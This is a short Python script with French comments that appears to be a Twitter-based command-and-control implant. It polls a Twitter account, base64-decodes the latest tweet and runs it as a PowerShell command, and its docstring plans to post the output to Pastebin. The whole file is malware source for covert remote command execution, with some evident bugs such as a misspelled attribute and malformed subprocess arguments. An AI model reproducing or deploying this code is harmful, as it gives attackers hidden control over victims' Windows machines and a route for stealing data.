"""
Requete sur page (compte twitter)   S1mpleCC
recuperer code html  > tweet
   donner a BS4 -> trouver les tweets
   Cibler les tweets avec les class

   Tweet > subprocess > execution d'une commande

   output > pastebin


   Table de correspondance : mots cles = action
   """

#p.class.TweetTextSize.TweetTextSize--normal.js-tweet-text.tweet-text
#https://twitter.com/s1mpleCC

import requests,pastebin, base64, time, subprocess
from bs4 import BeautifulSoup

#boucle  While  True
#Utilisation d'une variable pour garder le dernier tweet

lasttweet = ""


while True:
	
		#recupere le contenu et envoyer la page a BS
		requete = requests.get("https://twitter.com/s1mpleCC")
		page = requete.content
		soup = BeautifulSoup(page)

		#Recupere le tweet et l afficher decoded 
		tweet = soup.find("p", {"class": "TweetTextSize TweetTextSize--normal js-tweet-text tweet-text"})
		#print tweet.string

		if lasttweet != tweet :
			tweetdecode = tweet.string.decode("base64")
			#print tweetdecode

			#Ouvrir un subprocess Powershell et executer la commande du tweet
			proc2 = subprocess.Popen(["C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"], tweetdecode,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			cmdStdOut = proc2.stdout.read()
			cmdStdErr = proc2.sterr.read()
			res = cmdStdOut + cmdStdErr

			lasttweet = tweet
			time.sleep(10)
